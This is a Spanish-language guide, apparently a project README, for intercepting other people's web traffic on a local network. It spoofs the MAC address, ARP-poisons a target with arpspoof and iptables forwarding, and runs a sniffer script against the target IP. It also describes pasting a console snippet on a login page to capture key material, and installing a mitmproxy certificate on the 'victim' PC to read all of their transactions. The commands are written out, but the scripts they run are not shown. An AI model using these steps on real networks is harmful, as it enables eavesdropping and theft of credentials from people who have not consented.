# Sniffer http-https, deffie hellman y guia para realizar sniffer https con mitmproxy

## Sniffer http-https

Primero debemos cambiar nuestra direccion mac con machanger de la siguiente manera:

```bash
# bajar interfaz
sudo ip link set dev wlan0 down # aqui por ejemplo es la wlan0

# Cambiar serial de la mac
sudo macchanger -m aa:bb:cc:44:55:66 wlan0

# subir interfaz
sudo ip link set dev wlan0 up

# ver los cambios
macchanger -s wlan0

# Para dejar la mac por defecto repetimos los pasos anteriores de bajar la interfaz y cuando hagamos el cambio subirla

macchanger -p wlan0
```

Antes de ejecutar el sniffer primero debemos enevenar por medio de arp, este protocolo nos permite maperar
las direcciones IP a direcciones MAC en redes locales. Para ellos vamos a usar la herramienta arpspoof

```bash

iptables --policy FORWARD ACCEPT # Aceptar paquetes entrantes para redirigirlos al destino

ip route show default | awk '{print $3}' # ver ip-route

sudo arpspoof -i <interfaz-red> -t <ip-target> -r <ip-route>
```

Para ejecutar este sniffer solo debemos instalar los paquetes necesarios del script sniffer y ejecutar el siguiente
comando

```bash

sudo nohup python3 main.py -i <interfaz-red> -t <ip-target> -v > file.txt 2>&1 &

```

---

## Ejecutar deffie hellman

Entramos a la pagina donde queremos tomar a llave privada del navegador, antes de enviar el formulario
del login abrimos la consola del navegador y colocamos el contenido que esta en el deffie web console,
damos enter y enviamos el formulario.

Este nos va a devolver un certificado que debemos guardar, vamos a la peticion deckey y tomamos el publickeyback,
iv (vector de inicializacion), encryptedData.

Ejecutamos el script en nuestra maquina:

```bash
python3 deffie.py
```

El programa te pedira agregar los datos correspondientes que obtuvimos en el paso anterior

## sniffer con mitmproxy

primero debemos descargar los binarios:

wget https://downloads.mitmproxy.org/12.0.0/mitmproxy-12.0.0-linux-x86_64.tar.gz

Lo descomprimimos con tar -xvf mitproxy.tar y ejecutamos el ./mitproxy

En el pc de la victima entramos a mitm.it y descargamos el certificado dependiendo el sistema operativo,
configuramos para que acepte nuestra maquina como un proxy y agregamos el certificado a nuestra maquina como
uno de confianza.

Finalmente cuando hagamos consultas web podremos ver todas las transacciones realizadas por el usuario
